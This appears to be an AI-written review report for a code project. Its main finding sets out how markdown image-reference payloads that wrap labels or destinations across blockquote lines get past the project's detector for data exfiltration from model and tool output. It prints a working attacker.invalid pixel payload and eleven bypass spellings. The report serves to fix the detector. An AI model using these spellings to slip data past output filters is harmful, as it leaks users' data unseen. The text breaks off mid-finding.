# Managed review round 2026-09-07 — agent-first-core phases 0, 1, 2

Reviewer: `managed-round-2026-09-07` (independent; wrote none of the code under review).
Scope: flows 232 (phase 0), 233 (phase 1), 234 (phase 2), all criteria currently marked confirmed.

## State of the tree — read this first

I was asked to review `65def515` on `codex/agent-first-core` with a clean working tree. At the
start of the session that is exactly what I found:

```
$ pwd && git status --porcelain | head -50 && git rev-parse HEAD
/Users/Goodea/goodea/keryx
65def5156aa8b67233d6c7f91cd93b3d26783fd7
```

**The tree moved under me during the review.** Roughly two minutes in, HEAD advanced:

```
$ git rev-parse HEAD
0ae1456b76ff1752d466972f4d489c5917d20179
$ git status --porcelain
 M .metaproject/data/gdgraph/.provenance.json
$ keryx ctx run -- git diff --name-status 65def515 0ae1456b
M	scripts/typecheck.test.ts
```

`0ae1456b` — "test(scripts): give the compiler-spawning typecheck tests an explicit budget" —
was authored at 12:25:12 +0400, after my session began and before I dispatched any sub-review.
It is not mine. This checkout is shared with a concurrent session, which is the hazard the
project's own memory records ("Concurrent sessions need worktrees").

Why the review is still valid at the commit I was asked about:

```
$ keryx ctx run -- git diff --name-only 65def515 HEAD -- src/
(no output)
```

Nothing under `src/` differs between `65def515` and the tree I probed. Every finding below is a
statement about `65def515` as well as about `0ae1456b`. The one changed file is a test timeout
budget in `scripts/typecheck.test.ts`; it touches phase 0's AC5 area only by making those tests
less flaky. (Separately, and outside my scope: that commit carries a `Co-Authored-By` trailer,
which this project's recorded convention forbids.)

The single dirty file, `.metaproject/data/gdgraph/.provenance.json`, is a side effect of routing
my searches through `keryx ctx`. I edited no file under `src/`, `scripts/`, `docs/` or
`.metaproject/` other than this report.

## Method

Criteria were read from the frozen files, not from any summary. Each claim below was **driven** —
a fixture built, a real CLI or a real port invoked, the output captured. Where a claim rests on
reading source rather than running it, I say so in the finding's `evidence` and lower its
`confidence`. Two sub-reviews were dispatched under my direction for the AFC-09 and AFC-25 lanes;
**every load-bearing claim they returned I re-ran myself before recording it here**, and where my
own first fixture was wrong I discarded my own observation rather than report it (see "What I got
wrong", below).

Renderer questions were settled against `marked@17.0.1`, already present in `node_modules` — a
real renderer, offline, no network.

## Class enumeration (added 2026-09-07, after `keryx review attach` refused this report)

`review attach` refused to record F-001 through F-008 because a blocker or major must enumerate
the class it belongs to — every site holding the shape, and how the set was derived. That refusal
is correct, and this programme is where it was earned: three times a fix repaired the one site a
finding named and left its siblings for the next round.

Each of the eight now carries a `class_scope` with `sites` and `enumeration_method`. Every set was
derived by running searches and probes **in this session**, not by recalling the earlier round. The
searches are named in each `enumeration_method`, verbatim, so they can be re-run; where a claim
rests on reading rather than running, the method says so in the same sentence. Sites that are
*not* members are listed with their reason rather than filtered out, because silently dropping a
candidate is the judgement that produces the next miss. All eight original findings have since
been fixed, so most sites are recorded as "carried the shape, fixed" — the enumeration describes
where the class lives, not where the defect currently is.

**Four of the enumerations turned up sites nobody had fixed, and they are new findings, not
footnotes to the old ones:**

- **F-015 (blocker)** — F-001's class has two more members. `readInlineDestination` and
  `readStartTag` both cross a line terminator without consuming a repeated container marker.
  Eleven spellings bypass the mandatory auto-fetch floor against `marked`, and both public
  boundaries return gate PASS with the attacker's URL unmasked. This is the fourth round in which
  one member of this class was repaired and its siblings were left.
- **F-016 (major)** — F-003's class has two more members: `keryx test explain` and `keryx test
  suggest`. On the identical tree, `test related` now says `context: incomplete` and `test explain`
  says `related tests: 0`.
- **F-017 (minor)** — F-008's class: `keryx test status` renders a report whose own context says
  `incomplete` as `latest status: pass`.
- **F-018 (minor)** — F-008's class: the sonarqube importer swallows a `JSON.parse` failure and is
  recorded as `available / completed / parsed / 0`. This is the second instance F-008's note asked
  someone to confirm; it is real, on a different adapter than that note guessed. The one it did
  guess at (`tests.ts`) is unreachable dead code.

The verdicts below were written before this enumeration and are unchanged by it in direction:
flow 233's AC5 and flow 234's AC2 and AC7 already did not hold. F-015 and F-016 mean they still do
not hold on sites the repairs did not reach.

---

```json keryx:findings
[
  {
    "id": "F-001",
    "reviewer": "managed-round-2026-09-07",
    "severity": "blocker",
    "blocking_merge": true,
    "file": "src/security/detect/exfil.ts",
    "line": 837,
    "symbol": "normaliseLabel",
    "problem": "A twenty-first auto-fetch bypass. A reference-definition or reference-use LABEL that spans a line ending inside a blockquote, with the `>` marker repeated on the continuation line, is never matched: the label reader crosses the newline but does not consume the repeated container marker, so the key becomes `foo > bar` on one side and `foo bar` on the other and the two never join. T89 extended the block-marker skip to the START of a definition line and T90 extended it across newlines inside the DESTINATION; nobody extended it across newlines inside the LABEL.",
    "impact": "A working zero-click exfiltration channel in the mandatory floor. `marked` renders `<img src=\"https://attacker.invalid/pixel.png?d=...\">` and fetches the attacker's host; the detector reports zero findings, so `keryx security check-output` and `check-input` both return gate PASS / action allow with the URL unmasked. The allowlist cannot help, because there is no finding to allow. Eight spellings reproduce (bare, full, collapsed, image-in-link; nested quotes; three-line label; angle destination; CRLF), and the defect is independent on each side: definition-side label wrapping and use-side label wrapping each bypass on their own. This directly contradicts flow 233 AC5's confirmation note, which states that T89 and T90 closed the block-container class and that the remaining gaps were re-measured against `marked` with \"обходов нет\".",
    "suggested_fix": "In `normaliseLabel` (src/security/detect/exfil.ts:837), before collapsing whitespace, consume a repeated block-container prefix after every line terminator in the label — reusing `skipBlockContainerPrefix` exactly as `skipDestinationLeadingWhitespace` (T90) already does for the destination. `normaliseLabel` is the single choke point for BOTH sides (definition key at line 1132, use key at line 1373), so one edit closes both directions, and it returns a key only, never an offset, so nothing downstream shifts. One caveat that must be handled in the same change: `readLabel`'s pruning bound at lines 1354-1359 rests on the invariant \"normalising collapses whitespace but never removes a non-whitespace character\" (`normalise(span).length >= nonWhitespaceCount(span)`). Deleting `>` bytes breaks that invariant, so either apply the skip at the two reading sites before the span is measured, or relax the `nonWhitespace > budget.maxLength` test to account for removable marker bytes. Add RED/GREEN regressions beside the `T89:`/`T90:` tests in src/security/detect/exfil.test.ts covering both the definition-side and use-side wrap.",
    "evidence": "Renderer oracle (marked@17.0.1) plus detectExfil on identical bytes, /private/tmp/.../scratchpad/exfil-label-wrap.ts:\n  ok(flag) | control: label wraps, NO container      | detector findings=1\n  ok(flag) | control: single-line label in quote (T89) | detector findings=1\n  ok(flag) | control: dest wraps in quote (T90)        | detector findings=1\n  BYPASS   | label wraps in quote                      | detector findings=0\n  BYPASS   | label wraps in quote, full ref            | detector findings=0\n  BYPASS   | label wraps in quote, collapsed ref       | detector findings=0\n  BYPASS   | label wraps in quote, image-in-link       | detector findings=0\n  BYPASS   | label wraps, nested quote                 | detector findings=0\n  BYPASS   | label wraps 3 lines in quote              | detector findings=0\n  BYPASS   | label wraps in quote, angle dest          | detector findings=0\n  BYPASS   | label wraps in quote, CRLF                | detector findings=0\n  BYPASS   | USE side wraps inside quote, def plain    | detector findings=0\nRender of the exact payload \"![company logo]\\n\\n> [company\\n> logo]: https://attacker.invalid/pixel.png?d=aGVsbG8\\n\":\n  <p><img src=\"https://attacker.invalid/pixel.png?d=aGVsbG8\" alt=\"company logo\"></p>\nPublic boundary, control vs bypass (only difference is the wrapped label):\n  $ bun src/cli.ts security check-output --file control2.md --target file\n    gate: FAIL / action: block / findings: 1 / egress.reference-link-exfil (line 3)\n    Redacted: > [company logo]: [REDACTED:url]\n  $ bun src/cli.ts security check-output --file bypass2.md --target file\n    gate: PASS / action: allow / findings: 0\n  $ bun src/cli.ts security check-input --file bypass2.md --source tool-output\n    gate: PASS / action: allow / findings: 0\n  $ bun src/cli.ts security check-input --file control2.md --source tool-output\n    gate: FAIL / action: block / findings: 1\nThe committed suite does not catch it: `bun test src/security src/wiki src/memory src/gdgraph src/testing` -> 825 pass / 0 fail.",
    "class_scope": {
      "sites": [
        "src/security/detect/exfil.ts:1279-1286 — readReferenceDefinitions's line loop, the definition-line OPENING skip (T89). Calls skipBlockContainerPrefix at :1286. CARRIES THE SHAPE, FIXED.",
        "src/security/detect/exfil.ts:824-843 — skipDestinationLeadingWhitespace, the reference DESTINATION crossing a terminator (T90). Calls skipBlockContainerPrefix at :830. CARRIES THE SHAPE, FIXED.",
        "src/security/detect/exfil.ts:938-966 — stripBlockContainerMarkers, called from normaliseLabel (:961), the LABEL TEXT crossing a terminator on both the definition-key and use-key side (T91). Calls skipBlockContainerPrefix at :948. CARRIES THE SHAPE, FIXED — this is F-001 itself.",
        "src/security/detect/exfil.ts:1472-1520 — readLabel's O(1) pre-filter, which must be relaxed for spans that cross a terminator or it rejects a wrapped label before normalisation can strip anything. Reads index.lineTerminators (built at :640-648). CARRIES THE SHAPE (as the guard the label fix depends on), FIXED.",
        "src/security/detect/exfil.ts:1681-1709 — readInlineDestination. INLINE_DESTINATION (:753) is /\\(\\s*(?:<([^<>\\n]*)>|([^)\\s]+))[^)]*\\)/y; its leading `\\s*` and trailing `[^)]*` both cross a line terminator, and nothing consumes a repeated container marker after it. CARRIES THE SHAPE, NOT FIXED — see F-015.",
        "src/security/detect/exfil.ts:1968-2040 — readStartTag. Its before-attribute-name, after-attribute-name and before-value whitespace loops all use isHtmlSpace, which accepts a line terminator, so the reader crosses into a continuation line; nothing consumes a repeated container marker there. CARRIES THE SHAPE, NOT FIXED — see F-015.",
        "src/security/detect/exfil.ts:640-648 — the ContentIndex builder's LINE_TERMINATORS pass. Records terminator positions; reads no markdown construct across one. NOT A MEMBER, listed so the enumeration is closed rather than filtered.",
        "src/security/detect/exfil.ts:1347-1352 — readReferenceDefinitions's line-advance loop. Advances lineStart to the next physical line; it does not read a construct across the terminator (site 1 does that, one line earlier). NOT A MEMBER, listed for the same reason."
      ],
      "enumeration_method": "Derived now, not recalled. Three searches plus a renderer oracle. (1) `keryx ctx rg 'function (read|skip|normalise|scan|parse)' --glob 'src/security/detect/exfil.ts'` -> the file's nine reader/skipper functions (skipDestinationLeadingWhitespace 824, normaliseLabel 961, skipBlockContainerPrefix 1100, readDefinitionDestination 1201, readReferenceDefinitions 1224, readLabel 1472, readInlineDestination 1681, readBracketConstructs 1720, readStartTag 1968). (2) `keryx ctx rg 'LINE_TERMINATORS' --glob 'src/security/detect/exfil.ts'` -> the five explicit terminator sites (646, 829, 944, the 1015 definition, 1348). That search alone is NOT sufficient and this is the trap the earlier rounds fell into: two readers cross a terminator without ever consulting that Set — readInlineDestination through a regex whose `\\s*`/`[^)]*` span newlines (found via `keryx ctx rg 'INLINE_DESTINATION =|REFERENCE_DESTINATION =' --glob 'src/security/detect/exfil.ts'`, patterns read at :753 and :760), and readStartTag through isHtmlSpace. So (3) each of the nine functions from (1) was read and classified by hand on the question \"can this advance past a line terminator while still reading one construct\", and the eight-entry list above is that classification in full, non-members included. (4) The classification was then falsified against a renderer oracle rather than trusted: /private/tmp/.../scratchpad/f001-class.ts drives marked@17.0.1 (offline, from node_modules) and detectExfil over the same bytes for one payload per candidate member plus four controls. It reproduces flagged for sites 1-4 and BYPASS (renderer fetches attacker.invalid, detector findings=0) for sites 5 and 6. `keryx ctx rg 'skipBlockContainerPrefix' --glob 'src/**'` confirms the repair helper has exactly three call sites (:830, :948, :1286) — i.e. sites 5 and 6 were never wired to it. Not offered as an answer: \"I checked the other readers.\""
    },
    "confidence": "high",
    "disposition": {
      "state": "acted-on",
      "evidence": "Closed by flow 233 T91: normaliseLabel strips repeated container markers after every line terminator, reusing skipBlockContainerPrefix. Verified by the orchestrator against a renderer oracle: the reported spellings flag."
    }
  },
  {
    "id": "F-002",
    "reviewer": "managed-round-2026-09-07",
    "severity": "blocker",
    "blocking_merge": true,
    "file": "src/harness/tool/metaproject-adapter.ts",
    "line": 357,
    "symbol": "memorySearch",
    "problem": "Flow 234 AC6 is asserted against helpers that the agent-facing tool boundary does not use. `createMetaprojectAdapter().memorySearch` projects each hit to exactly `{path, title, type, status, score, excerpt}`, and `formatMemory` (src/harness/tool/metaproject-operations.ts:118-133) renders only those. Every AC6 field — exact source fragment, version, author, confirming participant, deferral caveat, and the explicit `unknown` sentinel — is discarded before the model sees anything.",
    "impact": "AC6 exists for exactly this path: \"search→compression→handoff\". The handoff text a model actually receives renders a council-confirmed, sourced, versioned decision and a completely unsourced entry in byte-identical shape. The deferral caveat is stripped. `src/mcp/tools.ts:649-652` (`memory.search`) calls the same adapter, so the MCP surface loses the same fields — the facade and the CLI were fixed and the third caller was missed, which is the exact recurrence this phase's own RESIDUALS names as its recurring failure.",
    "suggested_fix": "src/harness/tool/metaproject-adapter.ts:362-369 — carry the fields into the hit, reusing the sentinel `src/memory/report.ts` already applies: `version: scored.entry.version ?? \"unknown\"`, `source: scored.entry.provenance.source ?? \"unknown\"`, `link: scored.entry.provenance.link ?? \"unknown\"`, `author: scored.entry.author ?? \"unknown\"`, `confirmedBy: scored.entry.confirmedBy ?? \"unknown\"`, `caveat: scored.entry.caveat`, each bounded by `clipAutomaticRecallText`. Widen `MemorySearchHit` in src/harness/tool/metaproject-port.ts and the `hits` schema in src/harness/tool/metaproject-operations.ts. Render them in `formatMemory` (metaproject-operations.ts:126-131), mirroring the report formatter. Fixing the adapter closes the agent tool and both MCP paths at once.",
    "evidence": "Fixture: two accepted entries, one fully provenanced (Version 3.4.1, `## Provenance` bullets Source/Link/Author/Confirmed-By, top-level `Caveat:`), one with none.\nCLI text form carries everything (AC6 holds here):\n  $ bun src/cli.ts memory search \"zetaprobe zeta runtime builds\"\n    ### 1. Adopt zeta runtime\n    - type: decision | status: accepted | confidence: medium | version: 3.4.1\n    - provenance: docs/adr/0007.md#L42-L48 (https://example.invalid/adr7) | author: aleks.zeitler | confirmedBy: platform-council (quorum 2026-02-11)\n    - caveat: deferred until the node18 sunset lands\n    ### 2. Zeta lockfile drift\n    - provenance: unknown | author: unknown | confirmedBy: unknown\nSame fixture through the real port and the model-facing renderer:\n  $ bun -e '... createMetaprojectAdapter(FX).memorySearch(...) ; formatMemory(r)'\n    structured hits: [{\"path\":\"decisions/sourced.md\",\"title\":\"Adopt zeta runtime\",\"type\":\"decision\",\"status\":\"accepted\",\"score\":2.085,\"excerpt\":\"...\"},\n                      {\"path\":\"decisions/unsourced.md\",\"title\":\"Zeta lockfile drift\",\"type\":\"lesson\",\"status\":\"accepted\",\"score\":2.085,\"excerpt\":\"...\"}]\n    text the MODEL receives:\n      Memory hits for \"zetaprobe zeta runtime builds\" (2):\n        - Adopt zeta runtime (decisions/sourced.md, score 2.085) [decision/accepted] — ...\n        - Zeta lockfile drift (decisions/unsourced.md, score 2.085) [lesson/accepted] — ...\nNo version, no source, no author, no confirming participant, no caveat, no `unknown`.\nMCP path confirmed by direct read of src/mcp/tools.ts:649-652: `return createMetaprojectAdapter(cwd).memorySearch({ query })`.",
    "class_scope": {
      "sites": [
        "src/memory/report.ts:94-126 — renderMemorySearchReport's per-result projection. The reference shape: version, confidence, provenance.source/link, author, confirmedBy, caveat, scope, each with the explicit UNKNOWN sentinel. ALREADY CORRECT before this round.",
        "src/memory/search.ts:264 — renderSearchMarkdown, the human text form. ALREADY CORRECT.",
        "src/commands/memory.ts:251 — `keryx memory search` text output, calling site 2. ALREADY CORRECT.",
        "src/commands/memory.ts:216-240 — `keryx memory search --json`. CARRIED THE SHAPE, FIXED — this is F-005, a separate finding on the same class.",
        "src/harness/tool/metaproject-adapter.ts:375-401 — createMetaprojectAdapter().memorySearch, the agent-facing port projection. CARRIED THE SHAPE, FIXED — this is F-002 itself.",
        "src/harness/tool/metaproject-operations.ts:118-151 — formatMemory, the renderer whose text a model actually receives. CARRIED THE SHAPE (it can only render what the hit carries, and rendered six fields), FIXED.",
        "src/mcp/tools.ts:649-652 — MCP `memory.search`. Returns the adapter's structured result verbatim; it defines no projection of its own, so it inherits site 5 and needed no separate edit.",
        "src/mcp/metaproject-tools.ts:58-61 — MCP unified `memory_search`. Returns the port result verbatim; inherits site 5.",
        "src/flow/context.ts:67-83 — the flow-init \"Related Memory\" section, rendered through renderMemorySearchReportMarkdown (site 1). ALREADY CORRECT.",
        "src/harness/tool/builtin/metaproject-tools.ts:234-254 — the builtin interactive `memory_search` tool. Shells out to `keryx memory search`, so it inherits site 3's text form and defines no projection.",
        "src/commands/agent-approval-context.ts:56-61 — the approval-context hint, which prints `memory: ${hit.title}` only. A genuine projection of a memory hit for a consumer, and deliberately a single line for an approval prompt rather than a provenance surface. Listed because dropping it from the enumeration would be the same judgement call that produced this finding; flagged as intentional, not as a defect."
      ],
      "enumeration_method": "Derived now. `keryx ctx rg 'searchEntries|searchMemory|memorySearch' --glob 'src/**'` over the routed raw log with test files filtered out gives every production caller of a memory search: src/flow/context.ts:71, src/memory/service.ts:172, src/commands/agent-approval-context.ts:57, src/mcp/metaproject-tools.ts:60, src/mcp/tools.ts:651, src/harness/tool/metaproject-operations.ts:612, src/harness/tool/builtin/metaproject-tools.ts:234, src/harness/tool/metaproject-adapter.ts:344. Each was then read to decide whether it DEFINES a projection (reduces a ScoredEntry to a consumer-visible shape) or merely forwards one; src/memory/service.ts:172 is the source of hits rather than a projection and is excluded, the two MCP entries forward verbatim and are listed as inheriting. `keryx ctx rg 'renderSearchMarkdown|renderMemorySearchReport'` adds the two renderer-side projections (memory/report.ts, memory/search.ts) that no memorySearch call site names. Verified by running, not by reading: /private/tmp/.../scratchpad/f002-probe.ts drives the REAL createMetaprojectAdapter().memorySearch and the REAL formatMemory over a two-entry fixture (one fully provenanced, one bare) and both now carry version/provenance/author/confirmedBy/caveat with the literal \"unknown\" for the bare entry; `bun src/cli.ts memory search <q>` and `... --json` were driven over the same fixture and agree field for field."
    },
    "confidence": "high",
    "disposition": {
      "state": "acted-on",
      "evidence": "Closed by flow 234 T23: the adapter carries version, provenance, author, confirmedBy and caveat into the hit with the unknown sentinel, and the memory formatter renders them. The MCP tool shares the adapter and is fixed with it."
    }
  },
  {
    "id": "F-003",
    "reviewer": "managed-round-2026-09-07",
    "severity": "major",
    "blocking_merge": true,
    "file": "src/harness/tool/metaproject-adapter.ts",
    "line": 503,
    "symbol": "testRelated",
    "problem": "Flow 234 AC2 requires that an inability to refresh return `incomplete` rather than `no-tests`. `computeTestingContext` does produce `incomplete` with reasons, and T21 wired that into `TestingReport` and the strict run. It reaches no read-only surface: `keryx test related`, the agent tool boundary, and the MCP `test_related` tool all discard it and render a legitimate empty success.",
    "impact": "An agent asking \"what tests cover this file\" over a subtree the walk could not read is told, with `isError: false` and exit 0, that there are none. That is precisely the failure-as-empty-success shape the criterion forbids, on the surfaces an agent actually uses. `TestRelatedResult` (src/harness/tool/metaproject-port.ts:133-140) has no field that could carry the status, so the capability exists only inside `runTesting`.",
    "suggested_fix": "Add `contextStatus?: \"complete\" | \"incomplete\"` and `incompleteReasons?: string[]` to `TestRelatedResult` (src/harness/tool/metaproject-port.ts:133-140). In src/harness/tool/metaproject-adapter.ts:501-508 replace `deps.findRelatedTests(cwd, input.file)` with `computeTestingContext(cwd)` + `relatedTestsInContext(...)` (both already exported) and populate the new fields — this also removes a second tree walk. In `formatTestRelated` (src/harness/tool/metaproject-operations.ts), branch on `contextStatus === \"incomplete\"` BEFORE the `tests.length === 0` branch and name the unreadable paths. In `runRelated` (src/commands/test.ts:257-266) print `context: incomplete` and the reasons, exactly as `runRun` already does at src/commands/test.ts:166-171.",
    "evidence": "Fixture with an unreadable subtree (`chmod 000 locked/`):\n  $ bun -e '... computeTestingContext(cwd)'\n    status: incomplete | reasons: [\"locked: EACCES: permission denied, scandir '.../fx-lock/locked'\"]\n  $ bun src/cli.ts test related locked/secret.ts\n    # related tests: locked/secret.ts\n    - none\n    EXIT=0\n  $ bun -e '... createMetaprojectAdapter(cwd).testRelated({file:\"locked/secret.ts\"}) ; formatTestRelated(r)'\n    structured: {\"file\":\"locked/secret.ts\",\"tests\":[]}\n    renderer: formatTestRelated {\"output\":\"No related tests found for locked/secret.ts.\",\"isError\":false}\nThe strict run path does behave correctly (driven in a sub-review under my direction): `test run --strict` on the same shape prints `# Test Report: FAIL` with `context: incomplete` and exits 1.",
    "class_scope": {
      "sites": [
        "src/commands/test.ts:250-280 — runRelated, `keryx test related`. CARRIED THE SHAPE, FIXED: now computes the context itself and prints `context: incomplete` with reasons.",
        "src/harness/tool/metaproject-adapter.ts:533-555 — testRelated, the agent/MCP port. CARRIED THE SHAPE, FIXED: TestRelatedResult now carries `context: {status, incompleteReasons}`.",
        "src/harness/tool/metaproject-operations.ts:288-305 — formatTestRelated, the model-facing renderer. CARRIED THE SHAPE, FIXED: branches on context.status before the empty-tests branch.",
        "src/harness/tool/metaproject-operations.ts:709-730 — the `test_related` tool descriptor used by both the agent loop and MCP. Forwards port result to site 3; defines no answer of its own.",
        "src/commands/test.ts:143-183 — runRun / `--strict`. ALREADY CORRECT (T21).",
        "src/commands/test.ts:123-141 — runAnalyze, `keryx test analyze`. ALREADY CORRECT: prints `status:` and the reasons.",
        "src/commands/test.ts:217-248 — runReport, `keryx test report latest`. ALREADY CORRECT: prints `context: incomplete` and the reasons.",
        "src/commands/test.ts:282-311 — runExplain, `keryx test explain`. Answers \"what tests cover this\" via findRelatedTests and prints `related tests: 0` with no status. CARRIES THE SHAPE, NOT FIXED — see F-016.",
        "src/commands/test.ts:65-121 — runSuggest, `keryx test suggest`. Computes the context at :79 but the model prompt it builds (:111-119) states only `Existing related tests: none`, so the incompleteness never reaches the answer. CARRIES THE SHAPE, NOT FIXED — see F-016.",
        "src/commands/test.ts:185-195 — runStatus, `keryx test status`. Reads the report and prints `latest status: pass` with no context line. CARRIES THE SHAPE, NOT FIXED — see F-017.",
        "src/commands/test.ts:197-215 — runContext, `keryx test context`. Prints the cached context's frameworks/scripts/configs/test-file counts and its recommendations but not its own `status` field. Borderline: it is a dump of the context object rather than an answer to a testing question, so it is listed as a member of the enumeration and NOT raised as a finding.",
        "src/testing/service.ts:372-391 — relatedTestsInContext and findRelatedTests, the shared lookup. Returns test paths only, by design; the status lives on the TestingContext the caller already holds, so this is the source the callers above must not drop, not a member that can carry it."
      ],
      "enumeration_method": "Derived now. `keryx ctx rg 'findRelatedTests|relatedTestsInContext|testRelated|test_related' --glob 'src/**'` over the routed raw log with test files filtered gives every production caller: src/commands/test.ts:80, :263, :291; src/harness/tool/metaproject-adapter.ts:544; src/harness/tool/metaproject-operations.ts:287, :709; src/testing/service.ts:372, :383. Because the class is defined by the QUESTION answered rather than by the helper called, that list was widened with `keryx ctx rg '^async function run|^function run' --glob 'src/commands/test.ts'` (nine subcommands) and `keryx ctx rg 'loadTestingReport|loadCompatibleTestingReport|report\\.context'`, and every one of the nine was read and classified. Verified by running: fixture /private/tmp/.../scratchpad/fx-lock2 with `chmod 000 locked/` and a readable target `src/a.ts`, so every surface faces the same tree and the same question. `bun src/cli.ts test related src/a.ts` prints `context: incomplete` with the EACCES reason; `bun src/cli.ts test explain src/a.ts` on the identical tree prints `related tests: 0` and no status; `bun src/cli.ts test status` (fixture fx-rep, a report whose context.status is incomplete) prints `latest status: pass`; `bun src/cli.ts test report latest` on that same report prints `context: incomplete`. The adapter and renderer were driven directly and return the context object and the INCOMPLETE banner. runSuggest is the one member I could NOT drive end to end — it calls a model provider — so its classification rests on reading :79 and :111-119, and is recorded as a code fact, not a run."
    },
    "confidence": "high",
    "disposition": {
      "state": "acted-on",
      "evidence": "Closed by flow 234 T23: TestRelatedResult carries the context status, the adapter computes it instead of discarding it, and the formatter branches on incomplete before the empty branch."
    }
  },
  {
    "id": "F-004",
    "reviewer": "managed-round-2026-09-07",
    "severity": "major",
    "file": "src/wiki/ask.ts",
    "line": 398,
    "symbol": "wikiCandidates",
    "problem": "Flow 234 AC1 requires the six lifecycle classes to have the same tolerance in wiki and memory. They agree in default retrieval, but the two historical-mode surfaces disagree on four of the six classes for the identical input file. `keryx wiki ask --as-of <date>` uses the date only to LABEL: `if (!lifecycle.current && !historicalMode) continue;` admits every non-current item regardless of the date. `keryx memory search --as-of <date>` SCOPES inclusion by the date. The flag is deliberately spelled identically on both commands (src/commands/wiki.ts:250-253), so the same idiom yields different admission.",
    "impact": "The same memory entry file gets two different verdicts from two commands with the same flag and the same date. `wiki ask --as-of 2020-01-01` surfaces superseded and malformed-date memory entries that `memory search --as-of 2020-01-01` refuses. Labelling mitigates but does not make the tolerance identical, which is what the criterion asks for. This is the gap flow 234's own RESIDUALS records (\"labels by date but does not scope inclusion by date, unlike memory\"); the parity test that proves AC1 (src/wiki/lifecycle-parity.test.ts) only exercises default mode, so nothing covers this.",
    "suggested_fix": "In `wikiCandidates`/`memoryCandidates` (src/wiki/ask.ts:398 and :445), in historical mode admit only items whose validity interval contains `observedAt` — i.e. keep the label from `computeLifecycle` but gate inclusion on the same `isValidAt(entry, asOf)` test `temporalMatch` applies in src/memory/search.ts:156-159 — so `--as-of` means the same thing on both commands. If the divergence is intended, say so in the criterion and in `keryx wiki ask --help`, and extend src/wiki/lifecycle-parity.test.ts to assert the intended asymmetry rather than leaving historical mode untested.",
    "evidence": "Identical event-time facts written into a memory entry and a wiki page per class, driven through both real CLIs at --as-of 2020-01-01 (/private/tmp/.../scratchpad/asof-matrix.sh):\n  class        | memory search --as-of | wiki ask --as-of\n  future       | reject                | wiki-page=ADMIT  memory-entry=ADMIT   <-- same memory file, different verdict\n  expired      | reject                | wiki-page=ADMIT  memory-entry=ADMIT   <-- same memory file, different verdict\n  validthen    | ADMIT                 | wiki-page=ADMIT  memory-entry=ADMIT\n  deprecated   | ADMIT                 | wiki-page=ADMIT  memory-entry=ADMIT\n  superseded   | reject                | wiki-page=ADMIT  memory-entry=ADMIT   <-- same memory file, different verdict\n  malformed    | reject                | wiki-page=ADMIT  memory-entry=ADMIT   <-- same memory file, different verdict\nSingle-case detail:\n  $ bun src/cli.ts wiki ask \"...\" --as-of 2020-01-01 --json\n    citations: memory/decisions/future.md {historical:true, lifecycleState:\"future\", lifecycleReasons:[\"not-yet-valid\"]}\n               wiki/decisions/future.md   {historical:true, lifecycleState:\"future\", ...}\n  $ bun src/cli.ts memory search \"...\" --as-of 2020-01-01\n    Results: 0\nDefault mode agrees on all seven parity classes: `bun test src/wiki/lifecycle-parity.test.ts` passes within the 825-pass focused run.",
    "class_scope": {
      "sites": [
        "src/memory/search.ts:143-166 — temporalMatch, the admission decision behind `keryx memory search` in both default and `--as-of` mode. The reference implementation the other surfaces are measured against; ALREADY CORRECT.",
        "src/wiki/ask.ts:383-441 — wikiCandidates, wiki-page admission under `keryx wiki ask --as-of`. Gate at :438. CARRIED THE SHAPE, FIXED — this is F-004's named site.",
        "src/wiki/ask.ts:463-503 — memoryCandidates, memory-entry admission under `keryx wiki ask --as-of`. Gate at :501. This is the THIRD surface the finding asked for and the one that made the divergence visible, because the same memory file got two verdicts from two commands. CARRIED THE SHAPE, FIXED.",
        "src/wiki/ask.ts:371-378 — isAdmittedAtAsOf, the shared historical-mode predicate sites 2 and 3 now both call, delegating to memory/temporal.ts's isValidAt so there is one grammar rather than three.",
        "src/memory/temporal.ts:34 isValidAt and :43 isCurrentAt — the validity-interval predicate every member above resolves to. Not itself an admission surface; listed because it is where a divergence would have to be fixed if the predicates ever forked again.",
        "src/memory/relevant.ts:107 and :131 — automatic recall's admission filter, `isCurrentMemory(entry, now)`. Decides admission by date, but has no `--as-of` mode at all: it is unconditionally current-only, so there is no second spelling for it to diverge from. Member of the class, not a divergence.",
        "src/memory/inject.ts:59 — the procedural-memory block's admission filter, isCurrentMemory. Same disposition as site 6.",
        "src/memory/lifecycle.ts:199-215 — computeLifecycle. Uses the observed date to LABEL an entry future/expired/superseded/malformed; it never admits or rejects. Explicitly NOT a member — and worth naming, because F-004 was precisely the confusion of labelling with admission."
      ],
      "enumeration_method": "Derived now. Two searches: `keryx ctx rg 'asOf|as-of|observedAt|historicalMode|isValidAt|temporalMatch' --glob 'src/**'` and `keryx ctx rg 'isCurrent|currentDay|supersededBy' --glob 'src/**'`, both over the routed raw logs with test files and comment-only lines filtered out. Together they cover both spellings of a date decision — the `--as-of` surfaces and the implicit \"today\" ones — which the first search alone misses; that is how sites 6 and 7 entered the list. Every hit was read and classified as admits-by-date, labels-by-date, or neither. Verified by running both real CLIs over one fixture rather than by reading: /private/tmp/.../scratchpad/fx-asof holds the same event-time facts as a memory entry AND a wiki page for each of five classes (future, expired, valid-then, superseded, malformed date). At `--as-of 2020-01-01`, `bun src/cli.ts memory search --json` admits exactly decisions/validthen.md, and `bun src/cli.ts wiki ask --json` admits exactly memory/decisions/validthen.md and wiki/decisions/validthen.md — the four classes that previously diverged (future, expired, superseded, malformed) are now rejected by both."
    },
    "confidence": "high",
    "disposition": {
      "state": "acted-on",
      "evidence": "Closed by flow 234 T24: wiki historical mode gates inclusion on the same validity-interval test memory applies, and the parity test was extended to historical mode, which it did not cover."
    }
  },
  {
    "id": "F-005",
    "reviewer": "managed-round-2026-09-07",
    "severity": "major",
    "file": "src/commands/memory.ts",
    "line": 204,
    "symbol": "runSearch",
    "problem": "`keryx memory search --json` emits `{score, title, type, status, path}` only. Every AC6 provenance field is dropped, and because the keys are simply absent there is no `unknown` sentinel either — a consumer cannot distinguish \"this entry has no source\" from \"this surface does not report sources\". The human text form of the very same command carries all of it.",
    "impact": "The machine-readable form of the command is strictly weaker than its human form, on the criterion that is specifically about a source being explicitly visible. Any script or agent that (sensibly) prefers `--json` loses the whole of AC6.",
    "suggested_fix": "src/commands/memory.ts:204-216 — build the JSON payload from `renderMemorySearchReport(...)`'s per-result projection (src/memory/report.ts:94-126), which already carries version, provenance, author, confirmedBy, caveat and scope with the explicit `unknown` sentinel, instead of hand-rolling five fields.",
